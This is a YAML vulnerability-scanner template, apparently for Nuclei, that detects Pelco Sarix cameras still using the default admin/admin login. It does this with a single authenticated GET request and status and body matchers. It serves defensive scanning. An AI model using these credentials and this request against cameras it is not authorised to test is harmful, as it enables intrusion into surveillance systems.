id: pelco-sarix-default-login

info:
  name: Pelco Sarix - Default Login
  author: tdiderich
  severity: high
  description: |
    Pelco Sarix camera default login credentials (admin/admin) were discovered.
  reference:
    - https://www.pelco.com/
  classification:
    cwe-id: CWE-798
  metadata:
    verified: true
    max-request: 1
    vendor: pelco
    product: sarix
    runzero-match: asset["hw"] matches "(i)Pelco Sarix"
  tags: pelco,sarix,default-login

http:
  - raw:
      - |
        GET /cgi-bin/get?system.access_level HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ":" + password)}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    stop-at-first-match: true
    host-redirects: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "system.access_level"